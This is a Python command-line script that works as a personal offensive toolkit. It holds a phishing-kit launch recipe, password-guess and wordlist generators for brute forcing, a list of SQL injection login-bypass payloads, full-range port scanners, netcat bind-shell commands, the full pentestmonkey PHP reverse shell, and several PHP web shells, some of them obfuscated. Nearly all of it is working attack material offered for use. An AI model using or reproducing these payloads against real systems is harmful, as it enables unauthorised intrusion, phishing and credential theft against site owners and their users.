import sys
import socket
from datetime import datetime

file = None
alphsym = "#"
repeater=0
alph = 0
wordlist=[]
import os
alphlist = "abcd"
wordsymbol="!"
q=0
p=0
r=0
s=0
while True:
    command = input("Enter a command: ")
    
    if command.startswith("phish"):
      print('''git clone https://github.com/thelinuxchoice/blackeye
cd blackeye
bash blackeye.sh
Get ngrok link: ngrok http 333''')
    elif command.startswith("open"):
        _, filename = command.split(" ")
        file = open(filename, 'w')  # Open in write mode

    elif command == "close":
        if file:
            file.close()
            file = None
            break
        else:
            print("No file is currently open.")
  
    elif command.startswith("man"):
        _, text = command.split(" ", 1)
        if file:
            file.write(text + "\n")
            file.flush()  # Flush the buffer to ensure immediate write
        else:
            print("No file is currently open.")

    elif command.startswith("usealph"):
        alph = 1
        print("Using Alphabets")
    elif command.startswith("yeem"):
        id_input = input("Enter the ID: ")
        output_filename = "passwords.txt"

        with open(output_filename, "w") as output_file:
            output_file.write(f"Input ID: {id_input}\n")
    
            # Generate variations of passwords
            variations = [f"{id_input}1", f"{id_input}11", f"{id_input}1!",f"{id_input}{id_input}1!",f"{id_input}123",f"{id_input}123!@#",f"{id_input}2023"]
    
            for variation in variations:
                output_file.write(variation + "\n")

    elif command.startswith("not usealph"):
        alph = 0
        print("Not Using Alphabets")

    elif command.startswith("alphall"):
        alphlist = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"
        print("52 ALPHABETS APPENDED")
    elif command.startswith("sql-injection"):
      filename = "a.txt"  # Replace with the desired file name
      with open(filename, "w") as file:
          file.write("or 1=1\nor 1=1--\nor 1=1#\nor 1=1/*\nadmin' --\nadmin' #\nadmin'/*\nadmin' or '1'='1\nadmin' or '1'='1'--\nadmin' or '1'='1'#\nadmin' or '1'='1'/*\nadmin'or 1=1 or ''='\nadmin' or 1=1\nadmin' or 1=1--\nadmin' or 1=1#\nadmin' or 1=1/*\nadmin') or ('1'='1\nadmin') or ('1'='1'--\nadmin') or ('1'='1'#\nadmin') or ('1'='1'/*\nadmin') or '1'='1\nadmin') or '1'='1'--\nadmin') or '1'='1'#\nadmin') or '1'='1'/*\n1234 ' AND 1=0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055\nadmin\" --\nadmin\" #\nadmin\"/*\nadmin\" or \"1\"=\"1\nadmin\" or \"1\"=\"1\"--\nadmin\" or \"1\"=\"1\"#\nadmin\" or \"1\"=\"1'/*\nadmin\"or 1=1 or \"\"=\"\nadmin\" or 1=1\nadmin\" or 1=1--\nadmin\" or 1=1#\nadmin\" or 1=1/*\nadmin\") or (\"1\"=\"1\nadmin\") or (\"1\"=\"1\"--\nadmin\") or (\"1\"=\"1\"#\nadmin\") or (\"1\"=\"1'/*\nadmin\") or \"1\"=\"1\nadmin\") or \"1\"=\"1\"--\nadmin\") or \"1\"=\"1\"#\nadmin\") or \"1\"=\"1'/*\n1234 \" AND 1=0 UNION ALL SELECT \"admin\", \"81dc9bdb52d04dc20036dbd8313ed055\"\n")
          file.flush()


    elif command.startswith("alphman"):
        command = input("Enter lists of alphabets: ")
        print(f"Using {command}.")
        alphlist = command
        command=" "
      
    elif command.startswith("alph") and alph and alphlist and alphsym:
        command = command.replace("alph ", "")
        print(alphlist)
        repeater=0
        for l in range(len(command)):  # This script detects how many alphsyms are in the command
            if command[l] == alphsym:
                repeater += 1
        for i in range(len(alphlist)):
            output = command.replace(alphsym, alphlist[i % len(alphlist)], 1)
            print(f"File input: {output}")  # Input printing
            file.write(f"{output}\n")
            file.flush()
            if repeater >= 2:
                for j in range(len(alphlist)):
                    aoutput = output.replace(alphsym, alphlist[j % len(alphlist)], 1)
                    print(f"File input: {aoutput}")  # Input printing
                    file.write(f"{aoutput}\n")
                    file.flush()
                    if repeater >= 3:
                        for k in range(len(alphlist)):
                            boutput = aoutput.replace(alphsym, alphlist[k % len(alphlist)], 1)
                            print(f"File input: {boutput}")
                            file.write(f"{boutput}\n")
                            file.flush()
                            if repeater >= 4:
                                for m in range(len(alphlist)):
                                    coutput = boutput.replace(alphsym, alphlist[m % len(alphlist)], 1)
                                    print(f"File input: {coutput}")
                                    file.write(f"{coutput}\n")
                                    file.flush()

    elif command.startswith("clear"):
        if os.name == 'nt':  # For Windows
          _ = os.system('cls')
        else:  # For Linux and Mac
          _ = os.system('clear')
                                  
    elif command.startswith("number"):
        _, message, digits = command.split(" ")
        digits = int(digits)
    
        if file:
            with open(file.name, 'a') as append_file:  # Open in append mode
                for i in range(1, 10 ** digits):
                    number = str(i).zfill(digits)
                    output = f"{message}{number}"
                    append_file.write(output + "\n")
                    append_file.flush()  # Flush the buffer to ensure immediate write
                    print(f"File input: {output}")
        else:
            print("No file is currently open.")

    elif command.startswith("yeemmap"): 
      if 1==1:
        # Define our target
        target = input("Enter target IP or hostname: ")
        
        print("-" * 50)
        print("Scanning target: " + target)
        print("Time started: " + str(datetime.now()))
        print("-" * 50)
        
        try:
            for port in range(1, 65536):  # Scanning all well-known ports
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                socket.setdefaulttimeout(1)
                result = s.connect_ex((target, port))
                if result == 0:
                    print(f"Port {port} is open")
                s.close()
        except KeyboardInterrupt:
            print("Exiting program.")
            sys.exit()
        except socket.gaierror:
            print("Hostname could not be resolved")
            sys.exit()
        except socket.error:
            print("Could not connect to server")
            sys.exit()
    
    elif command.startswith("ymap"): 
      # Define our target
      target = input("Enter target IP or hostname: ")
      
      print("-" * 50)
      print("Scanning target: " + target)
      print("Time started: " + str(datetime.now()))
      print("-" * 50)
      
      try:
          for port in range(1, 1025):  # Scanning all well-known ports
              s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
              socket.setdefaulttimeout(1)
              result = s.connect_ex((target, port))
              if result == 0:
                  print(f"Port {port} is open")
              s.close()
      except KeyboardInterrupt:
          print("Exiting program.")
          sys.exit()
      except socket.gaierror:
          print("Hostname could not be resolved")
          sys.exit()
      except socket.error:
          print("Could not connect to server")
          sys.exit()



    elif command.startswith("alphsym"):
        command = input("Enter the alphsym character: ")
        alphsym = command

    elif command.startswith("word"):
      if command == "word -r":
          wordlist = []
          print("Word list cleared.")
      elif command.startswith("word-a"):
          _, word = command.split(" ")
          wordlist.append(word)
          print(wordlist)
          print(f"Word '{word}' appended to the word list.")
      elif command.startswith("word-s"):
          _, symbol = command.split(" ")
          wordsymbol = symbol
          print(f"Word symbol set to '{wordsymbol}'.")

      elif command.startswith("word-f"):
          _, p = command.split(" ", 1)
          with open(file.name, 'a') as append_file:
              for i in range(len(wordlist)):
                  doutput = p.replace(wordsymbol, wordlist[i], 1)
                  print(doutput)
                  append_file.write(doutput + "\n")
                  append_file.flush()
      

      else:
        print("Invalid Command.")
  
    elif command.startswith("HelloWorld"):
      print("Hello World!")
    elif command.startswith("rshell-php"):
      ip=input("What is your ip")
      port=input("What is your listening port?")
      print("""<?php
  // php-reverse-shell - A Reverse Shell implementation in PHP
  // Copyright (C) 2007 pentestmonkey@pentestmonkey.net

  set_time_limit (0);
  $VERSION = "1.0";
  $ip = '{ip}';  // You need to change this
  $port = {port};  // And this
  $chunk_size = 1400;
  $write_a = null;
  $error_a = null;
  $shell = 'uname -a; w; id; /bin/sh -i';
  $daemon = 0;
  $debug = 0;

  //
  // Daemonise ourself if possible to avoid zombies later
  //

  // pcntl_fork is hardly ever available, but will allow us to daemonise
  // our php process and avoid zombies.  Worth a try...
  if (function_exists('pcntl_fork')) {
    // Fork and have the parent process exit
    $pid = pcntl_fork();
    
    if ($pid == -1) {
      printit("ERROR: Can't fork");
      exit(1);
    }
    
    if ($pid) {
      exit(0);  // Parent exits
    }

    // Make the current process a session leader
    // Will only succeed if we forked
    if (posix_setsid() == -1) {
      printit("Error: Can't setsid()");
      exit(1);
    }

    $daemon = 1;
  } else {
    printit("WARNING: Failed to daemonise.  This is quite common and not fatal.");
  }

  // Change to a safe directory
  chdir("/");

  // Remove any umask we inherited
  umask(0);

  //
  // Do the reverse shell...
  //

  // Open reverse connection
  $sock = fsockopen($ip, $port, $errno, $errstr, 30);
  if (!$sock) {
    printit("$errstr ($errno)");
    exit(1);
  }

  // Spawn shell process
  $descriptorspec = array(
    0 => array("pipe", "r"),  // stdin is a pipe that the child will read from
    1 => array("pipe", "w"),  // stdout is a pipe that the child will write to
    2 => array("pipe", "w")   // stderr is a pipe that the child will write to
  );

  $process = proc_open($shell, $descriptorspec, $pipes);

  if (!is_resource($process)) {
    printit("ERROR: Can't spawn shell");
    exit(1);
  }

  // Set everything to non-blocking
  // Reason: Occsionally reads will block, even though stream_select tells us they won't
  stream_set_blocking($pipes[0], 0);
  stream_set_blocking($pipes[1], 0);
  stream_set_blocking($pipes[2], 0);
  stream_set_blocking($sock, 0);

  printit("Successfully opened reverse shell to $ip:$port");

  while (1) {
    // Check for end of TCP connection
    if (feof($sock)) {
      printit("ERROR: Shell connection terminated");
      break;
    }

    // Check for end of STDOUT
    if (feof($pipes[1])) {
      printit("ERROR: Shell process terminated");
      break;
    }

    // Wait until a command is end down $sock, or some
    // command output is available on STDOUT or STDERR
    $read_a = array($sock, $pipes[1], $pipes[2]);
    $num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);

    // If we can read from the TCP socket, send
    // data to process's STDIN
    if (in_array($sock, $read_a)) {
      if ($debug) printit("SOCK READ");
      $input = fread($sock, $chunk_size);
      if ($debug) printit("SOCK: $input");
      fwrite($pipes[0], $input);
    }

    // If we can read from the process's STDOUT
    // send data down tcp connection
    if (in_array($pipes[1], $read_a)) {
      if ($debug) printit("STDOUT READ");
      $input = fread($pipes[1], $chunk_size);
      if ($debug) printit("STDOUT: $input");
      fwrite($sock, $input);
    }

    // If we can read from the process's STDERR
    // send data down tcp connection
    if (in_array($pipes[2], $read_a)) {
      if ($debug) printit("STDERR READ");
      $input = fread($pipes[2], $chunk_size);
      if ($debug) printit("STDERR: $input");
      fwrite($sock, $input);
    }
  }

  fclose($sock);
  fclose($pipes[0]);
  fclose($pipes[1]);
  fclose($pipes[2]);
  proc_close($process);

  // Like print, but does nothing if we've daemonised ourself
  // (I can't figure out how to redirect STDOUT like a proper daemon)
  function printit ($string) {
    if (!$daemon) {
      print "$string
";
    }
  }

  ?>""")
    
    elif command.startswith("rshell-rce"):
        print("<?php system($_GET[\"cmd\"]);?>")
    elif command.startswith("bshell"):
      print("nc -lvp 4444 -e /bin/sh")
      print("nc <target ip> 4444")
    elif command.startswith("rshell-oth"):
        print('''Obfuscated PHP Web Shell
<?=`$_GET[0]`?>
<?=`$_POST[0]`?>
<?=`{$_REQUEST['_']}`?>
<?=$_="";$_="'" ;$_=($_^chr(4*4*(5+5)-40)).($_^chr(47+ord(1==1))).($_^chr(ord('_')+3)).($_^chr(((10*10)+(5*3))));$_=${$_}['_'^'o'];echo`$_`?>

<?php $_="{"; $_=($_^"<").($_^">;").($_^"/"); ?><?=${'_'.$_}['_'](${'_'.$_}['__']);?>''')

    else:
        print("Invalid command. Try again.")


